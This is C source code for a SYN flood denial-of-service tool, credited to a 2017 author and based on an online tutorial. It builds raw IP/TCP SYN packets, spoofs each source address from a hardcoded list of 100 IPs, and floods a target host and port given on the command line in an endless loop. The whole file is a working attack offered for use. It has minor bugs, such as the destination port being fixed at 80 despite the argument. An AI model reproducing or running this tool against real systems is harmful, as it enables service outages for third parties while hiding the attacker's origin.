/* 
	Written by John Hippisley, 2017
    Based off www.binarytides.com/syn-flood-dos-attack/
*/

#include <stdio.h> 			// Input and output
#include <stdlib.h> 		// exit()
#include <string.h> 		// memset()
#include <time.h> 			// rand()
#include <errno.h> 			// errno()
#include <sys/socket.h> 	// Kernel functoins for sockets
#include <arpa/inet.h> 		// inet_addr()
#include <netinet/tcp.h> 	// Provides declarations for TCP header
#include <netinet/ip.h> 	// Provides declarations for IP header
 
int packets_sent;
char ips[100][32] = {		// 100 random ip addresses
    "202.161.7.26","203.50.74.222",
    "65.131.157.226","100.155.175.174",
    "78.89.163.19","169.114.227.66",
    "110.35.10.107","8.233.103.37",
    "225.221.217.70","241.209.172.145",
    "131.115.31.121","196.219.70.96",
    "68.156.56.100","88.127.133.171",
    "29.218.165.202","68.108.124.0",
    "117.118.145.9","22.187.127.192",
    "36.207.248.233","200.187.245.173",
    "21.147.186.115","176.161.219.216",
    "48.46.216.186","1.253.99.87",
    "35.98.231.187","90.83.85.167",
    "150.129.248.191","73.73.95.252",
    "119.84.98.41","39.217.215.183",
    "13.109.171.53","242.25.113.113",
    "122.124.148.32","113.82.79.153",
    "87.128.186.196","244.80.126.4",
    "162.218.144.215","218.104.96.7",
    "12.72.33.145","209.75.58.72",
    "217.25.140.71","225.1.37.47",
    "144.18.213.221","98.222.25.86",
    "193.242.29.224","214.36.253.59",
    "173.198.228.118","137.157.4.14",
    "234.168.96.89","55.80.65.208",
    "131.210.228.196","23.64.249.129",
    "2.203.53.176","228.227.93.168",
    "59.2.196.100","129.29.245.115",
    "197.4.123.118","37.86.4.200",
    "123.236.11.134","62.20.17.159",
    "57.231.88.188","156.151.247.245",
    "109.124.104.166","153.211.97.198",
    "40.172.43.103","80.50.122.17",
    "218.146.118.132","161.177.192.224",
    "102.139.121.17","107.107.50.90",
    "107.138.159.218","220.158.93.131",
    "130.53.29.114","131.74.61.120",
    "191.45.245.180","67.164.33.99",
    "99.85.36.38","180.109.222.135",
    "198.202.217.3","5.242.166.182",
    "218.129.62.133","221.210.115.205",
    "143.199.245.227","180.162.198.229",
    "123.54.29.4","1.134.68.188",
    "237.179.124.127","115.59.208.227",
    "230.126.29.11","184.41.145.7",
    "215.53.114.96","124.156.59.251",
    "74.70.113.183","135.206.222.141",
    "236.112.62.182","121.68.169.234",
    "49.94.82.79","213.151.133.244",
    "25.160.80.238","4.47.44.26"
};

struct pseudo_header // Needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};
void printerror(char* msg)
{
	perror(msg);
	exit(-1);
}
int random_num(int min, int max)
{
    int r = (rand() % (max + 1 - min)) + min;
    return r;
}
void textintro()
{
    // ANSII color-codes in here!
    printf(" \x1b[35m _______           _          _______  _        _______  _______  ______  \n");
    printf("(  ____ \\|\\     /|( (    /|  (  ____ \\( \\      (  ___  )(  ___  )(  __  \\ \n");
    printf("| (    \\/( \\   / )|  \\  ( |  | (    \\/| (      | (   ) || (   ) || (  \\  )\n");
    printf("| (_____  \\ (_) / |   \\ | |  | (__    | |      | |   | || |   | || |   ) |\n");
    printf("(_____  )  \\   /  | (\\ \\) |  |  __)   | |      | |   | || |   | || |   | |\n");
    printf("      ) |   ) (   | | \\   |  | (      | |      | |   | || |   | || |   ) |\n");
    printf("/\\____) |   | |   | )  \\  |  | )      | (____/\\| (___) || (___) || (__/  )\n");
    printf("\\_______)   \\_/   |/    )_)  |/       (_______/(_______)(_______)(______/ \n");
    printf("                                          \x1b[36mVersion 1.0   NOTE-must be root\x1b[35m\n");
    printf("==========================================================================\x1b[0m\n\n");

}
unsigned short csum(unsigned short *ptr,int nbytes) // Calculates checksum for headers
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) 
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes==1) 
    {
        oddbyte=0;
        *((u_char*) &oddbyte) = *(u_char*) ptr;
        sum += oddbyte;
    }
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer= (short) ~ sum;
    
    return(answer);
}

int main (int argc, char** argv)
{
    srand(time(NULL)); 
	if(argc < 3)
    {
        printf("Usage: sudo ./synflood [desination-ip] [destination-port]\n");
        exit(-1);
    }
 
    textintro(); // Script-kiddies love this crap
    printf("Getting ready to attack '%s', at port #%i\n\n", argv[1], atoi(argv[2]));
    printf("Creating sockets and structs...\n");

    int sock = socket (PF_INET, SOCK_RAW, IPPROTO_TCP); // Create a raw socket endpoint
    char datagram[4096]; 								// Datagram to represent the packet
    struct iphdr *iph = (struct iphdr *) datagram; 		// IP header

    // TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct pseudo_header psh;

    // Destinaton struct
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);

    // Zero out the buffer
    memset (datagram, 0, 4096); 
     
    // Fill IP Header
    printf("Filling IP header...\n");
    iph->ihl = 5; 												// Header length
    iph->version = 4;											// ipv4
    iph->tos = 0;												// Type of service (not used)
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);	// Size of header and data
    iph->frag_off = 0; 											// Fragmentation set to 0
    iph->ttl = 255; 											// Used to prevent routing loops
    iph->protocol = IPPROTO_TCP; 								// Transfer protocol
    iph->check = 0;      										// Set to 0 before calculating checksum
    iph->daddr = sin.sin_addr.s_addr;							// Destination ip
     
    // Fill TCP Header
    printf("Filling TCP header...\n");
    tcph->dest = htons (80);									// Destinaton port				
    tcph->seq = 0;												// seq number
    tcph->ack_seq = 0;											// ack-seq number
    tcph->doff = 5;      										// Specifies where data starts (none)
    tcph->fin=0;												// FIN flag	
    tcph->syn=1;												// SYN flag (set)
    tcph->rst=0;												// RST flag
    tcph->psh=0;												// PSH flag
    tcph->ack=0;												// ACK flag	
    tcph->urg=0;												// URG flag
    tcph->window = htons (5840); 								// Max number of data client will accept
    tcph->check = 0;											// Set check to 0 for now
    tcph->urg_ptr = 0;											// Urgent pointer

    // IP_HDRINCL to tell the kernel that there's no need to generate the headers
    printf("Configuring socket...\n");
    int one = 1;
    const int *val = &one;
    if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) printerror("Error setting IP_HDRINCL");
    
    printf("Ready to flood %s:%s [ENTER]\n", argv[1], argv[2]); getchar();
    printf("\nFlooding..\n\n");
    while (1)
    {
        /*
        	Spoof the ip, source-port, and identification-number, 
			then calculate the checksum!
		*/
        iph->id = htons(random_num(0,0xFFFF));                                 	// Id of this packet (16 bits)
        iph->saddr = inet_addr(ips[random_num(0,99)]);                          // Spoof the source ip address
        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1); 	// Calculate IP check
       
        tcph->source = htons (random_num(0,0xFFFF)); 	// Source port (16 bit)
        psh.source_address = iph->saddr;                // Calculate TCP CHECK (includes IP header)
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(20);
        memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
        tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

        //Send the packet! (using a udp function-no need to make a connecton first)
        if (sendto(
                    sock,      				 	// Our socket
                    datagram,   			 	// The buffer containing headers and data
                    iph->tot_len,    		 	// Total length of our datagram
                    0,      				 	// Outing flags, normally always 0
                    (struct sockaddr *) &sin, 	// Socket addr, just like in
                    sizeof (sin)                // Size of address struct
             ) < 0)          
        {
            printerror("Error sending-");		// Uh-oh something went wrong!
        } else 									// Packet sent succesfully!
        {							
            if(packets_sent % 10000 == 0) printf("%s[UPDATE] 10,000 spoofed packets sent to %s%s\n", packets_sent % (10000*2) ? "*" :  " " ,argv[1], packets_sent % (10000*2) ? " " :  "*" );
            ++packets_sent;
        }
    }
    return 0;
}
